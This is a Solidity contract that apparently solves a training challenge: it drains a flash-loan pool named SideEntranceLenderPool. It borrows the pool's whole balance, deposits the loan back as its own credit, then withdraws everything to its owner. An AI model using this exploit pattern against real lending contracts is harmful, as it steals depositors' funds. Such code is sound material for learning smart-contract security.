pragma solidity ^0.6.0;

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

contract HackSideEntranceLenderPool {
    address pool;
    address owner;

    event Print(string);

    constructor(address _pool) public {
        pool = _pool;
        owner = msg.sender;
    }

    function hack() public {
        ISideEntranceLenderPool(pool).flashLoan(address(pool).balance);
        ISideEntranceLenderPool(pool).withdraw();
    }
    
    function execute() external payable {
        emit Print("Execute called: before deposit");
        ISideEntranceLenderPool(pool).deposit{value: msg.value}();
        emit Print("Execute called: deposit done");
    }

    function withdraw() public {
        require(msg.sender == owner);
        payable(address(msg.sender)).transfer(address(this).balance);
    }
    
    receive() external payable {}
}
